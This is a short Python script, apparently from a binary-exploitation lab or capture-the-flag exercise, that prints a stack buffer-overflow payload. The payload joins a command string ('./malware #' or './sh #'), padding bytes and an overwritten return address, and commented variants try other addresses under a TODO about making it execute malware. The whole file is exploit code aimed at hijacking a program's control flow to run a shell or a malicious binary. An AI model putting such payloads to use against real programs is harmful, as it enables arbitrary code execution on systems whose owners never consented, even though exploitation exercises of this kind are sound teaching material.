import sys
# TODO: modify the payload to execute malware

# payload = b'./malware #' + b'A' * 0x1D \
#         + b'\xc3\x11\x40\x00\x00\x00\x00\x00'

payload = b'./malware #' + b'A' * 0x1D \
        + b'\x9b\x11\x40\x00\x00\x00\x00\x00'

# payload = b"1+2+3"\
#         + b"4+5"

# payload = b'./malware #' + b'A' * 0x1D \
#         + b'\x60\x40\x40\x00\x00\x00\x00\x00'

# payload = b"./sh #" + b'A' * 0x22 \
#         + b'\x9b\x11\x40\x00\x00\x00\x00\x00'

sys.stdout.buffer.write(payload)